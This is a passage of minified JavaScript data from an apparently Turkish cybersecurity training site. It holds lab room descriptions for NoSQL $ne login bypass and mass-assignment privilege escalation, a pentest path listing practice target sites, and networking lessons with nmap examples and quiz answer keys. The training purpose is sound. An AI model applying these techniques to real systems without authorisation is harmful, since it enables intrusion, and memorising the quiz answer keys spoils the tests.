operat\xF6rlerini (`$ne` - not equal vb.) kullanma","Admin giri\u015Fini \u015Fifre bilmeden bypass etme"],realWorld:"NoSQL Injection, SQL Map gibi geleneksel taray\u0131c\u0131lar taraf\u0131ndan kolayca tespit edilemeyebilir ancak ayn\u0131 derecede tehlikelidir ve t\xFCm veritaban\u0131 \u015Femas\u0131n\u0131 d\xF6kmeye veya yetkisiz giri\u015Fe yol a\xE7abilir. \xC7\xF6z\xFCm, girdilerin \u015Fema d\xFCzeyinde do\u011Frulanmas\u0131d\u0131r.",learned:["NoSQL veritabanlar\u0131nda sorgu enjeksiyonu yapmay\u0131 \xF6\u011Frendin.","`$ne` operat\xF6r\xFC kullanarak kullan\u0131c\u0131 do\u011Frulamalar\u0131n\u0131 atlatmay\u0131 ba\u015Fard\u0131n."]},"web-19":{scenario:"Merhaba {name}. Kullan\u0131c\u0131 hesab\u0131 ayarlar\u0131n\u0131 g\xFCncellerken HTTP POST istek g\xF6vdesinde (JSON) gizli parametrelerin (\xF6rne\u011Fin `role: 'user'` veya `is_admin: false`) g\xF6nderildi\u011Fini g\xF6rd\xFCk. Bu iste\u011Fi yakalay\u0131p rol de\u011Ferini `admin` olarak manip\xFCle etmeli ve sunucuda dikey yetki y\xFCkseltme ger\xE7ekle\u015Ftirmelisin.",goals:["Kullan\u0131c\u0131 profil g\xFCncelleme isteklerini yakalama","Gizli parametreleri (Mass Assignment / Parameter Pollution) ke\u015Ffetme","Rol manip\xFClasyonu ile dikey yetki y\xFCkseltme (Privilege Escalation)"],realWorld:"\u0130stemciden gelen rol bilgilerinin sunucu taraf\u0131nda roller hiyerar\u015Fisiyle denetlenmeden do\u011Frudan veritaban\u0131na yaz\u0131lmas\u0131 (Mass Assignment), bir kullan\u0131c\u0131n\u0131n saniyeler i\xE7inde admin yetkisi kazanmas\u0131na neden olur.",learned:["Parametre manip\xFClasyonu ile dikey yetki y\xFCkseltme yapmay\u0131 \xF6\u011Frendin.","Sunucu taraf\u0131nda korumas\u0131z b\u0131rak\u0131lan veri modeli g\xFCncelleme a\xE7\u0131klar\u0131n\u0131 tespit ettin."]}},p=[{slug:"web-pentest",name:"Web Pentest Uzman\u0131 Yolu",icon:"\u{1F310}",color:"#00ff88",desc:"S\u0131f\u0131rdan web s\u0131zma testi uzman\u0131na \u2014 teori, pratik ve ger\xE7ek hedef sitelerde pentest.",phases:[{id:"phase-1",name:"Teori & Ortam Kurulumu",desc:"Ara\xE7lar\u0131n\u0131 kur, temel kavramlar\u0131 \xF6\u011Fren.",icon:"\u{1F4DA}",order:1,type:"theory",items:[{type:"doc",id:"doc-kali-setup",name:"Kali Linux & Burp Suite Kurulumu",readTime:"15 dk",required:!0},{type:"doc",id:"doc-http-basics",name:"HTTP Protokol\xFC & Web Mimarisi",readTime:"12 dk",required:!0},{type:"doc",id:"doc-devtools",name:"Taray\u0131c\u0131 DevTools Kullan\u0131m\u0131",readTime:"8 dk",required:!0}]},{id:"phase-2",name:"Temel Zafiyetler",desc:"Ba\u015Flang\u0131\xE7 seviyesi web zafiyetlerini ke\u015Ffet ve s\xF6m\xFCr.",icon:"\u{1F513}",order:2,type:"practice",requires:["phase-1"],items:[{type:"room",id:"web-13"},{type:"room",id:"web-11"},{type:"room",id:"web-15"},{type:"room",id:"web-19"},{type:"room",id:"web-01"},{type:"room",id:"web-04"},{type:"room",id:"web-14"},{type:"room",id:"web-12"}]},{id:"phase-3",name:"Orta Seviye Sald\u0131r\u0131lar",desc:"Daha karma\u015F\u0131k zafiyet zincirleri ve istek manip\xFClasyonu.",icon:"\u26A1",order:3,type:"practice",requires:["phase-2"],items:[{type:"doc",id:"doc-burp-proxy",name:"Burp Suite Proxy ile \u0130stek Manip\xFClasyonu",readTime:"10 dk",required:!0},{type:"room",id:"web-02"},{type:"room",id:"web-05"},{type:"room",id:"web-06"},{type:"room",id:"web-16"},{type:"room",id:"web-17"}]},{id:"phase-4",name:"\u0130leri Seviye Sald\u0131r\u0131lar",desc:"Shell alma, dosya y\xFCkleme bypass, SSRF ve JWT s\xF6m\xFCr\xFCs\xFC.",icon:"\u{1F525}",order:4,type:"practice",requires:["phase-3"],items:[{type:"doc",id:"doc-shells",name:"Web Shell & Reverse Shell Temelleri",readTime:"10 dk",required:!0},{type:"room",id:"web-03"},{type:"room",id:"web-07"},{type:"room",id:"web-08"},{type:"room",id:"web-18"},{type:"room",id:"web-09"}]},{id:"phase-5",name:"Ger\xE7ek Pentest Operasyonu",desc:"Canl\u0131 hedef sitelerde tam s\u0131zma testi ger\xE7ekle\u015Ftir.",icon:"\u{1F480}",order:5,type:"pentest",requires:["phase-4"],premium:!0,items:[{type:"doc",id:"doc-pentest-methodology",name:"Pentest Metodolojisi & Raporlama",readTime:"15 dk",required:!0},{type:"doc",id:"doc-recon-tools",name:"Ke\u015Fif Ara\xE7lar\u0131: Nmap, Dirb, Gobuster",readTime:"12 dk",required:!0},{type:"target",id:"target-01",name:"Hedef Site 1: Teksas \xDCniversitesi OBS",targetUrl:"https://target-1-ng42bphos-kinyas-projects.vercel.app",flagCount:5},{type:"target",id:"target-02",name:"Hedef Site 2: Bazaario E-Ticaret Platformu",targetUrl:"https://target-2-9wegc53mz-kinyas-projects.vercel.app",flagCount:4},{type:"target",id:"target-03",name:"Hedef Site 3: Washington Bank Kurumsal \u015Eubesi",targetUrl:"https://target-3-cw9jbn9uk-kinyas-projects.vercel.app",flagCount:4},{type:"target",id:"target-04",name:"Hedef Site 4: Vera Chat \u0130leti\u015Fim Portal\u0131",targetUrl:"https://target-4-2520wlvyg-kinyas-projects.vercel.app",flagCount:6}]}]}],s={};d.forEach(a=>{s[a.id]=a});function g(a){if(a.type==="room"){const i=s[a.id];return i?{...a,name:i.name,difficulty:i.difficulty,points:i.points,users:i.users,desc:i.desc}:a}return a}function k(a,i,n,l){const r=a.phases.find(e=>e.id===i);return r?r.items.every(e=>e.type==="room"?n.includes(e.id):e.type==="doc"&&e.required?l.includes(e.id):e.type==="target"?n.includes(e.id):!0):!1}function m(a,i,n,l){const r=a.phases.find(e=>e.id===i);return!r||!r.requires?!0:r.requires.every(e=>k(a,e,n,l))}function S(a,i,n,l,r){if(!m(a,i,l,r))return!1;const e=a.phases.find(u=>u.id===i);if(!e||n<=0)return!0;const t=e.items[n-1];return t.type==="room"?l.includes(t.id):t.type==="doc"?r.includes(t.id):t.type==="target"?l.includes(t.id):!0}Object.assign(window,{SK_CATEGORIES:o,SK_ALL_ROOMS:d,SK_ALL_BADGES:y,MENTOR_LESSONS_INFO:c,SK_PATHWAYS:p,SK_ROOMS_MAP:s,getPathwayItemDetails:g,isPhaseComplete:k,isPhaseUnlocked:m,isItemUnlocked:S});window.SK_LESSONS={"ag-guvenligi":[{id:"ag-01",title:"TCP/IP Model ve Katmanlar\u0131",content:"<h2>TCP/IP Modeli ve Katmanlar\u0131</h2><p>TCP/IP (Transmission Control Protocol/Internet Protocol), bilgisayarlar\u0131n internet \xFCzerinden ileti\u015Fim kurmas\u0131n\u0131 sa\u011Flayan temel a\u011F protokolleri k\xFCmesidir. G\xFCn\xFCm\xFCz internet mimarisi bu model \xFCzerine kuruludur.</p><p>TCP/IP modeli 4 ana katmandan olu\u015Fur:</p><ul><li><strong>Uygulama Katman\u0131 (Application):</strong> Kullan\u0131c\u0131 ile etkile\u015Fimde olan HTTP, FTP, SMTP, DNS gibi protokoller burada \xE7al\u0131\u015F\u0131r.</li><li><strong>Ta\u015F\u0131ma Katman\u0131 (Transport):</strong> Verilerin u\xE7tan uca ak\u0131\u015F\u0131n\u0131 ve b\xFCt\xFCnl\xFC\u011F\xFCn\xFC kontrol eder. TCP ve UDP burada yer al\u0131r.</li><li><strong>\u0130nternet Katman\u0131 (Internet):</strong> Veri paketlerinin IP adresleri kullan\u0131larak hedefe y\xF6nlendirilmesinden sorumludur. IP ve ICMP burada \xE7al\u0131\u015F\u0131r.</li><li><strong>A\u011F Eri\u015Fim Katman\u0131 (Network Access):</strong> Fiziksel kablolar, MAC adresleri ve ethernet donan\u0131m\u0131n\u0131 kapsar.</li></ul>",example:"<h3>\xD6rnek Senaryo:</h3><p>Bir web taray\u0131c\u0131s\u0131na <code>siberkampus.org</code> yaz\u0131p sayfay\u0131 y\xFCkledi\u011Finizde, veri yukar\u0131dan a\u015Fa\u011F\u0131ya paketlenir: Uygulama (HTTP) -> Ta\u015F\u0131ma (TCP Port 80/443) -> \u0130nternet (Kaynak ve Hedef IP) -> A\u011F Eri\u015Fim (MAC Adresleri).</p>",questions:[{q:"TCP/IP modelinde veri paketlerinin IP adresleri kullan\u0131larak hedefe y\xF6nlendirilmesini sa\u011Flayan katman hangisidir?",options:["Uygulama Katman\u0131","Ta\u015F\u0131ma Katman\u0131","\u0130nternet Katman\u0131","A\u011F Eri\u015Fim Katman\u0131"],correct:2},{q:"HTTP, DNS ve FTP protokolleri TCP/IP modelinin hangi katman\u0131nda \xE7al\u0131\u015F\u0131r?",options:["Uygulama Katman\u0131","Ta\u015F\u0131ma Katman\u0131","\u0130nternet Katman\u0131","A\u011F Eri\u015Fim Katman\u0131"],correct:0},{q:"Verinin u\xE7tan uca ak\u0131\u015F kontrol\xFCn\xFC ve b\xFCt\xFCnl\xFC\u011F\xFCn\xFC sa\u011Flayan Ta\u015F\u0131ma Katman\u0131 protokol\xFC hangisidir?",options:["IP","TCP","ICMP","MAC"],correct:1}]},{id:"ag-02",title:"OSI Referans Modeli",content:"<h2>OSI Referans Modeli</h2><p>OSI (Open Systems Interconnection) modeli, a\u011F ileti\u015Fimini standartla\u015Ft\u0131rmak i\xE7in ISO taraf\u0131ndan geli\u015Ftirilmi\u015F 7 katmanl\u0131 teorik bir referans modelidir.</p><p>Katmanlar a\u015Fa\u011F\u0131dan yukar\u0131ya \u015Fu \u015Fekildedir:</p><ol><li><strong>Fiziksel (Physical):</strong> Kablolar, fiber optik, bit d\xFCzeyinde iletim.</li><li><strong>Veri Ba\u011F\u0131 (Data Link):</strong> \xC7er\xE7eveleme (Framing), MAC adresleri, anahtarlay\u0131c\u0131lar (Switch).</li><li><strong>A\u011F (Network):</strong> IP adresleme, y\xF6nlendirme (Routing), y\xF6nlendiriciler (Router).</li><li><strong>Ta\u015F\u0131ma (Transport):</strong> Segmentasyon, ak\u0131\u015F kontrol\xFC, TCP/UDP.</li><li><strong>Oturum (Session):</strong> Ba\u011Flant\u0131lar\u0131n kurulmas\u0131, y\xF6netilmesi ve sonland\u0131r\u0131lmas\u0131.</li><li><strong>Sunum (Presentation):</strong> Veri bi\xE7imlendirme, \u015Fifreleme, s\u0131k\u0131\u015Ft\u0131rma (SSL/TLS, JPEG).</li><li><strong>Uygulama (Application):</strong> Kullan\u0131c\u0131 aray\xFCz\xFC, HTTP, FTP.</li></ol>",example:"<h3>\xD6rnek Analiz:</h3><p>\u015Eifreleme (SSL/TLS) veya veri s\u0131k\u0131\u015Ft\u0131rma i\u015Flemleri OSI modelinde 6. katman olan <strong>Sunum Katman\u0131</strong>'nda ger\xE7ekle\u015Fir. IP y\xF6nlendirmesi ise 3. katman olan <strong>A\u011F Katman\u0131</strong>'nda yap\u0131l\u0131r.</p>",questions:[{q:"OSI referans modelinde MAC adresleri ve \xE7er\xE7eveleme (framing) hangi katmanda yer al\u0131r?",options:["Fiziksel Katman","Veri Ba\u011F\u0131 Katman\u0131","A\u011F Katman\u0131","Ta\u015F\u0131ma Katman\u0131"],correct:1},{q:"Veri \u015Fifreleme, kodlama ve s\u0131k\u0131\u015Ft\u0131rma i\u015Flemleri hangi OSI katman\u0131n\u0131n sorumlulu\u011Fundad\u0131r?",options:["Sunum Katman\u0131","Uygulama Katman\u0131","Oturum Katman\u0131","Ta\u015F\u0131ma Katman\u0131"],correct:0},{q:"Y\xF6nlendiriciler (Router) ve IP protokol\xFC hangi OSI katman\u0131nda \xE7al\u0131\u015F\u0131r?",options:["Veri Ba\u011F\u0131 Katman\u0131","A\u011F Katman\u0131","Ta\u015F\u0131ma Katman\u0131","Uygulama Katman\u0131"],correct:1}]},{id:"ag-03",title:"IP Adresleme ve Alt A\u011Flar",content:"<h2>IP Adresleme ve Alt A\u011Flar (Subnetting)</h2><p>IP (Internet Protocol) adresi, a\u011Fdaki her cihaza atanan benzersiz bir kimlik numaras\u0131d\u0131r. IPv4 adresleri 32 bitliktir ve 4 oktetten (\xF6rne\u011Fin 192.168.1.1) olu\u015Fur.</p><p><strong>Alt A\u011F Olu\u015Fturma (Subnetting):</strong> B\xFCy\xFCk bir a\u011F\u0131 daha k\xFC\xE7\xFCk, y\xF6netilebilir a\u011Flara b\xF6lme i\u015Flemidir. Bu i\u015Flem a\u011F performans\u0131n\u0131 art\u0131r\u0131r ve g\xFCvenli\u011Fi kolayla\u015Ft\u0131r\u0131r. Alt a\u011F maskesi (Subnet Mask), bir IP adresinin hangi k\u0131sm\u0131n\u0131n a\u011F (Network ID) ve hangi k\u0131sm\u0131n\u0131n konak (Host ID) oldu\u011Funu belirtir.</p>",example:"<h3>Subnetting \xD6rne\u011Fi:</h3><p><code>192.168.1.0/24</code> a\u011F\u0131nda alt a\u011F maskesi <code>255.255.255.0</code>'d\u0131r. Bu a\u011Fda toplam 256 IP adresi bulunur, ancak ilk adres (A\u011F Adresi: 192.168.1.0) ve son adres (Yay\u0131n Adresi: 192.168.1.255) cihazlara atanamaz. Kullan\u0131labilir host say\u0131s\u0131 254't\xFCr.</p>",questions:[{q:"IPv4 adresleri toplam ka\xE7 bit uzunlu\u011Fundad\u0131r?",options:["16 bit","32 bit","64 bit","128 bit"],correct:1},{q:"192.168.1.0/24 a\u011F\u0131ndaki ilk kullan\u0131labilir (cihaza atanabilir) IP adresi hangisidir?",options:["192.168.1.0","192.168.1.1","192.168.1.254","192.168.1.255"],correct:1},{q:"Bir a\u011Fdaki yay\u0131n (broadcast) adresi ne ama\xE7la kullan\u0131l\u0131r?",options:["Sadece sunucuya veri g\xF6ndermek i\xE7in","A\u011Fdaki t\xFCm cihazlara ayn\u0131 anda veri g\xF6ndermek i\xE7in","IP adresini MAC adresine d\xF6n\xFC\u015Ft\xFCrmek i\xE7in","A\u011Flar\u0131 birbirine ba\u011Flamak i\xE7in"],correct:1}]},{id:"ag-04",title:"MAC Adresleri ve ARP Protokol\xFC",content:"<h2>MAC Adresi ve ARP Protokol\xFC</h2><p><strong>MAC (Media Access Control) Adresi:</strong> A\u011F kart\u0131 \xFCreticisi taraf\u0131ndan donan\u0131ma yaz\u0131lan, 48 bitlik fiziksel a\u011F adresidir. De\u011Fi\u015Ftirilemez (donan\u0131msal olarak) ve benzersizdir.</p><p><strong>ARP (Address Resolution Protocol):</strong> Yerel a\u011Fda, IP adresi bilinen bir cihaz\u0131n fiziksel MAC adresini bulmak i\xE7in kullan\u0131lan protokold\xFCr. Cihazlar a\u011Fda ileti\u015Fim kurmadan \xF6nce ARP iste\u011Fi (ARP Request) yay\u0131nlayarak hedef cihaz\u0131n MAC adresini \xF6\u011Frenir ve ARP tablosunda \xF6nbelle\u011Fe al\u0131r.</p>",example:"<h3>ARP \u0130stek Ak\u0131\u015F\u0131:</h3><p>Cihaz A (192.168.1.2), Cihaz B'nin (192.168.1.5) MAC adresini bilmiyorsa a\u011Fa bir yay\u0131n g\xF6nderir: <i>'192.168.1.5 IP adresine kim sahip? L\xFCtfen bana MAC adresinizi bildirin.'</i> Sadece Cihaz B bu iste\u011Fe kendi MAC adresiyle yan\u0131t verir.</p>",questions:[{q:"MAC adresleri toplam ka\xE7 bit uzunlu\u011Fundad\u0131r?",options:["24 bit","32 bit","48 bit","64 bit"],correct:2},{q:"IP adresini fiziksel MAC adresine \xE7\xF6z\xFCmlemekten sorumlu a\u011F protokol\xFC hangisidir?",options:["DHCP","DNS","ARP","ICMP"],correct:2},{q:"ARP istek mesaj\u0131 a\u011Fda ne t\xFCr bir iletim y\xF6ntemiyle g\xF6nderilir?",options:["Unicast (Tekli)","Multicast (\xC7oklu)","Broadcast (Yay\u0131n)","Anycast"],correct:2}]},{id:"ag-05",title:"DHCP Protokol\xFC",content:"<h2>DHCP (Dynamic Host Configuration Protocol)</h2><p>DHCP, a\u011Fa ba\u011Flanan cihazlara otomatik olarak IP adresi, alt a\u011F maskesi, varsay\u0131lan a\u011F ge\xE7idi (Gateway) ve DNS sunucusu bilgilerini atayan uygulama katman\u0131 protokol\xFCd\xFCr.</p><p>DHCP \xE7al\u0131\u015Fma mant\u0131\u011F\u0131 4 a\u015Famal\u0131 <strong>DORA</strong> s\xFCrecinden olu\u015Fur:</p><ol><li><strong>Discover (Ke\u015Fif):</strong> Cihaz a\u011Fda DHCP sunucusu arar (Broadcast).</li><li><strong>Offer (Teklif):</strong> DHCP sunucusu cihaza bo\u015F bir IP adresi teklif eder.</li><li><strong>Request (\u0130stek):</strong> Cihaz teklif edilen IP adresini kullanmak istedi\u011Fini belirtir.</li><li><strong>Acknowledge (Onay):</strong> Sunucu IP'yi cihaza tahsis eder ve s\xFCreci onaylar.</li></ol>",example:"<h3>DORA Analizi:</h3><p>Yeni a\xE7\u0131lan bir bilgisayar\u0131n ilk yapt\u0131\u011F\u0131 i\u015Flem a\u011Fa bir <strong>DHCP Discover</strong> paketi yay\u0131nlamakt\u0131r. Bu paket sayesinde IP adresi olmayan cihaz a\u011Fdaki sunucuyu bulur.</p>",questions:[{q:"DHCP protokol\xFCn\xFCn \xE7al\u0131\u015Fma mant\u0131\u011F\u0131n\u0131 \xF6zetleyen k\u0131saltma hangisidir?",options:["DNSA","ARPD","DORA","ICMP"],correct:2},{q:"A\u011Fa yeni kat\u0131lan ve IP'si olmayan bir cihaz\u0131n DHCP sunucusunu bulmak i\xE7in att\u0131\u011F\u0131 ilk paket hangisidir?",options:["Offer","Request","Acknowledge","Discover"],correct:3},{q:"DHCP sunucusu a\u011Fdaki cihazlara hangi bilgiyi otomatik olarak atamaz?",options:["IP Adresi","DNS Sunucusu","Donan\u0131m MAC Adresi","Varsay\u0131lan A\u011F Ge\xE7idi"],correct:2}]},{id:"ag-06",title:"DNS Protokol\xFC",content:"<h2>DNS (Domain Name System)</h2><p>DNS, insanlar\u0131n kolayca hat\u0131rlayabilece\u011Fi alan adlar\u0131n\u0131 (\xF6rn. <code>google.com</code>), bilgisayarlar\u0131n anlayabilece\u011Fi say\u0131sal IP adreslerine (\xF6rn. <code>142.250.185.78</code>) \xE7eviren internetin telefon rehberidir.</p><p>Temel DNS Kay\u0131t T\xFCrleri:</p><ul><li><strong>A Kayd\u0131:</strong> Alan ad\u0131n\u0131 IPv4 adresine y\xF6nlendirir.</li><li><strong>AAAA Kayd\u0131:</strong> Alan ad\u0131n\u0131 IPv6 adresine y\xF6nlendirir.</li><li><strong>CNAME (Alias):</strong> Bir alan ad\u0131n\u0131 ba\u015Fka bir alan ad\u0131na y\xF6nlendirir.</li><li><strong>MX (Mail Exchanger):</strong> Alan ad\u0131n\u0131n e-posta sunucusunu belirtir.</li><li><strong>TXT Kayd\u0131:</strong> Do\u011Frulama ve g\xFCvenlik bilgileri (SPF, DKIM) i\xE7in metin verisi tutar.</li></ul>",example:"<h3>Sorgu \xD6rne\u011Fi:</h3><p>Terminalde <code>nslookup siberkampus.org</code> veya <code>dig siberkampus.org</code> komutunu \xE7al\u0131\u015Ft\u0131rarak alan ad\u0131n\u0131n arkas\u0131ndaki A kayd\u0131n\u0131 (IP adresini) g\xF6rebilirsiniz.</p>",questions:[{q:"Bir alan ad\u0131n\u0131 IPv4 adresine y\xF6nlendiren DNS kay\u0131t t\xFCr\xFC hangisidir?",options:["MX","AAAA","A","CNAME"],correct:2},{q:"E-posta sunucular\u0131n\u0131n tespiti ve y\xF6nlendirilmesi i\xE7in hangi DNS kayd\u0131 kullan\u0131l\u0131r?",options:["TXT","MX","A","NS"],correct:1},{q:"DNS hangi ta\u015F\u0131ma katman\u0131 portunu varsay\u0131lan olarak kullan\u0131r?",options:["Port 53 (UDP/TCP)","Port 80 (TCP)","Port 443 (TCP)","Port 22 (TCP)"],correct:0}]},{id:"ag-07",title:"TCP ve UDP Protokolleri",content:"<h2>TCP ve UDP Protokolleri</h2><p>Ta\u015F\u0131ma katman\u0131n\u0131n en \xF6nemli iki protokol\xFC TCP ve UDP'dir. \u0130leti\u015Fim ihtiya\xE7lar\u0131na g\xF6re farkl\u0131 avantajlar sunarlar.</p><p><strong>TCP (Transmission Control Protocol):</strong> Ba\u011Flant\u0131 y\xF6nelimlidir (Connection-oriented). Veri g\xF6ndermeden \xF6nce ba\u011Flant\u0131 kurar. Hata kontrol\xFC, ak\u0131\u015F kontrol\xFC ve paket s\u0131ralamas\u0131 yapar. G\xFCvenilirdir ancak yava\u015Ft\u0131r. (HTTP, SSH, SMTP).</p><p><strong>UDP (User Datagram Protocol):</strong> Ba\u011Flant\u0131s\u0131zd\u0131r (Connectionless). Paketlerin ula\u015F\u0131p ula\u015Fmad\u0131\u011F\u0131n\u0131 kontrol etmez. H\u0131zl\u0131d\u0131r ancak g\xFCvensizdir. (DNS, Canl\u0131 Yay\u0131n, Online Oyun).</p>",example:"<h3>Kar\u015F\u0131la\u015Ft\u0131rma:</h3><p>Bir web sitesine girdi\u011Finizde verinin eksiksiz gelmesi gerekti\u011Fi i\xE7in <strong>TCP</strong> kullan\u0131l\u0131r. Ancak bir g\xF6r\xFCnt\xFCl\xFC konu\u015Fmada anl\u0131k kesintiler tolere edilebildi\u011Fi ve h\u0131z kritik oldu\u011Fu i\xE7in <strong>UDP</strong> tercih edilir.</p>",questions:[{q:"A\u015Fa\u011F\u0131dakilerden hangisi UDP protokol\xFCn\xFCn bir \xF6zelli\u011Fidir?",options:["Ba\u011Flant\u0131 y\xF6nelimli olmas\u0131","Hata ve ak\u0131\u015F kontrol\xFC yapmas\u0131","Veriyi \xE7ok h\u0131zl\u0131 ve kontrols\xFCz g\xF6ndermesi","Paket s\u0131ralamas\u0131n\u0131 garanti etmesi"],correct:2},{q:"Ba\u011Flant\u0131 y\xF6nelimli (connection-oriented) ve g\xFCvenli veri iletimi sa\u011Flayan protokol hangisidir?",options:["UDP","IP","TCP","ICMP"],correct:2},{q:"A\u015Fa\u011F\u0131daki protokollerden hangisi ta\u015F\u0131ma katman\u0131nda UDP kullan\u0131r?",options:["HTTP","HTTPS","DNS (Sorgular)","SSH"],correct:2}]},{id:"ag-08",title:"TCP \xDC\xE7l\xFC El S\u0131k\u0131\u015Fma",content:"<h2>TCP \xDC\xE7l\xFC El S\u0131k\u0131\u015Fma (Three-Way Handshake)</h2><p>TCP protokol\xFCnde iki cihaz aras\u0131nda g\xFCvenli bir veri aktar\u0131m\u0131 ba\u015Flamadan \xF6nce ba\u011Flant\u0131n\u0131n kurulmas\u0131 gerekir. Bu i\u015Fleme <strong>\xDC\xE7l\xFC El S\u0131k\u0131\u015Fma</strong> denir.</p><p>Ad\u0131mlar \u015Fu \u015Fekildedir:</p><ol><li><strong>SYN (Synchronize):</strong> \u0130stemci, sunucuya ba\u011Flant\u0131 kurmak istedi\u011Fini belirten SYN bayrakl\u0131 bir paket g\xF6nderir.</li><li><strong>SYN-ACK (Synchronize-Acknowledge):</strong> Sunucu iste\u011Fi kabul eder ve istemciye SYN ve ACK bayrakl\u0131 paketle yan\u0131t verir.</li><li><strong>ACK (Acknowledge):</strong> \u0130stemci, sunucunun yan\u0131t\u0131n\u0131 ald\u0131\u011F\u0131n\u0131 belirten ACK bayrakl\u0131 bir paket g\xF6nderir ve ba\u011Flant\u0131 kurulur (ESTABLISHED).</li></ol>",example:"<h3>Ba\u011Flant\u0131 Sonland\u0131rma (Teardown):</h3><p>TCP ba\u011Flant\u0131s\u0131n\u0131 kapatmak i\xE7in ise 4 ad\u0131ml\u0131 el s\u0131k\u0131\u015Fma yap\u0131l\u0131r ve bu s\xFCre\xE7te <strong>FIN (Finish)</strong> bayra\u011F\u0131 kullan\u0131l\u0131r.</p>",questions:[{q:"TCP el s\u0131k\u0131\u015Fma s\xFCrecini ba\u015Flatan ilk paket hangi bayra\u011Fa sahiptir?",options:["ACK","SYN","FIN","RST"],correct:1},{q:"Sunucunun istemciden gelen ba\u011Flant\u0131 iste\u011Fini kabul etti\u011Fini belirten paket hangisidir?",options:["SYN","ACK","SYN-ACK","FIN-ACK"],correct:2},{q:"TCP ba\u011Flant\u0131s\u0131n\u0131 sonland\u0131rmak (kapatmak) i\xE7in kullan\u0131lan bayrak hangisidir?",options:["SYN","RST","FIN","URG"],correct:2}]},{id:"ag-09",title:"Portlar ve Protokoller",content:"<h2>Portlar ve Protokoller</h2><p>Portlar, a\u011Fdaki bir bilgisayarda \xE7al\u0131\u015Fan farkl\u0131 servisleri ve uygulamalar\u0131 ay\u0131rt etmek i\xE7in kullan\u0131lan 16 bitlik say\u0131sal adreslerdir (0 - 65535 aras\u0131).</p><p>S\u0131k Kullan\u0131lan Standart Portlar:</p><ul><li><strong>21:</strong> FTP (Dosya Aktar\u0131m\u0131)</li><li><strong>22:</strong> SSH (G\xFCvenli Uzak Ba\u011Flant\u0131)</li><li><strong>23:</strong> Telnet (\u015Eifresiz Uzak Ba\u011Flant\u0131 - G\xFCvensiz)</li><li><strong>25:</strong> SMTP (E-posta G\xF6nderimi)</li><li><strong>53:</strong> DNS (Alan Ad\u0131 \xC7\xF6z\xFCmleme)</li><li><strong>80:</strong> HTTP (\u015Eifresiz Web \u0130leti\u015Fimi)</li><li><strong>443:</strong> HTTPS (\u015Eifreli/G\xFCvenli Web \u0130leti\u015Fimi)</li></ul>",example:"<h3>G\xFCvenlik Notu:</h3><p>S\u0131zma testlerinde ilk hedef, Telnet (23) veya FTP (21) gibi \u015Fifresiz veri aktaran g\xFCvensiz protokolleri tespit ederek a\u011F trafi\u011Finden kullan\u0131c\u0131 \u015Fifrelerini dinlemektir.</p>",questions:[{q:"G\xFCvenli uzak terminal ba\u011Flant\u0131s\u0131 (SSH) varsay\u0131lan olarak hangi port \xFCzerinden \xE7al\u0131\u015F\u0131r?",options:["Port 21","Port 22","Port 23","Port 80"],correct:1},{q:"HTTPS (\u015Eifreli Web Trafi\u011Fi) protokol\xFCn\xFCn varsay\u0131lan portu hangisidir?",options:["Port 80","Port 443","Port 8080","Port 22"],correct:1},{q:"Telnet (Port 23) protokol\xFCn\xFCn siber g\xFCvenlik a\xE7\u0131s\u0131ndan en b\xFCy\xFCk riski nedir?",options:["\xC7ok yava\u015F \xE7al\u0131\u015Fmas\u0131","T\xFCm trafi\u011Fi ve \u015Fifreleri a\xE7\u0131k metin (cleartext) olarak g\xF6ndermesi","Port taramalar\u0131nda tespit edilememesi","Sadece Unix sistemlerde \xE7al\u0131\u015Fmas\u0131"],correct:1}]},{id:"ag-10",title:"Nmap Temelleri ve Taramalar",content:"<h2>Nmap Temelleri</h2><p>Nmap (Network Mapper), a\u011F ke\u015Ffi ve g\xFCvenlik zafiyeti analizi i\xE7in kullan\u0131lan a\xE7\u0131k kaynakl\u0131 bir ara\xE7t\u0131r. A\u011Fdaki aktif cihazlar\u0131, a\xE7\u0131k portlar\u0131 ve \xE7al\u0131\u015Fan servisleri tespit eder.</p><p>Temel Tarama T\xFCrleri:</p><ul><li><strong>SYN Taramas\u0131 (`-sS`):</strong> Yar\u0131m a\xE7\u0131k (Half-open) taramad\u0131r. H\u0131zl\u0131d\u0131r ve do\u011Frudan TCP ba\u011Flant\u0131s\u0131 kurmad\u0131\u011F\u0131 i\xE7in daha az iz b\u0131rak\u0131r (Gizli tarama).</li><li><strong>TCP Ba\u011Flant\u0131 Taramas\u0131 (`-sT`):</strong> Tam bir 3'l\xFC el s\u0131k\u0131\u015Fma ger\xE7ekle\u015Ftirir. Sistem loglar\u0131nda iz b\u0131rak\u0131r ancak root yetkisi gerektirmez.</li><li><strong>UDP Taramas\u0131 (`-sU`):</strong> A\u011Fdaki a\xE7\u0131k UDP portlar\u0131n\u0131 tespit etmek i\xE7in kullan\u0131l\u0131r.</li></ul>",example:"<h3>Komut \xD6rne\u011Fi:</h3><p>Hedef sisteme h\u0131zl\u0131 ve gizli bir SYN taramas\u0131 ba\u015Flatmak i\xE7in terminale <code>nmap -sS 192.168.1.100</code> yazabilirsiniz.</p>",questions:[{q:"A\u015Fa\u011F\u0131dakilerden hangisi tam bir TCP 3'l\xFC el s\u0131k\u0131\u015Fmas\u0131 ger\xE7ekle\u015Ftirmeyen yar\u0131m a\xE7\u0131k (half-open) Nmap taramas\u0131d\u0131r?",options:["TCP Connect Scan (-sT)","SYN Scan (-sS)","UDP Scan (-sU)","Xmas Scan (-sX)"],correct:1},{q:"Nmap ile UDP portlar\u0131n\u0131 taramak i\xE7in hangi parametre kullan\u0131lmal\u0131d\u0131r?",options:["-sS","-sT","-sU","-sP"],correct:2},{q:"SYN taramas\u0131n\u0131n (-sS) TCP taramas\u0131na (-sT) g\xF6re en b\xFCy\xFCk avantaj\u0131 nedir?",options:["Hi\xE7bir cihaz taraf\u0131ndan engellenememesi","Daha h\u0131zl\u0131 olmas\u0131 ve hedef sistem loglar\u0131nda daha az iz b\u0131rakmas\u0131","\u015Eifreli servisleri \xE7\xF6zebilmesi","Root yetkisi gerektirmemesi"],correct:1}]},{id:"ag-11",title:"Nmap Versiyon ve OS Tespiti",content:"<h2>Nmap Versiyon ve \u0130\u015Fletim Sistemi Tespiti</h2><p>Bir s\u0131zma testinde a\xE7\u0131k portlar\u0131 bulmak yeterli de\u011Fildir. Hedefte \xE7al\u0131\u015Fan yaz\u0131l\u0131mlar\u0131n tam versiyonlar\u0131n\u0131 ve i\u015Fletim sistemini bilmek, uygun exploit'i se\xE7mek i\xE7in \u015Fartt\u0131r.</p><p>Geli\u015Fmi\u015F Nmap Parametreleri:</p><ul><li><strong>`-sV` (Version Detection):</strong> A\xE7\u0131k portlarda \xE7al\u0131\u015Fan 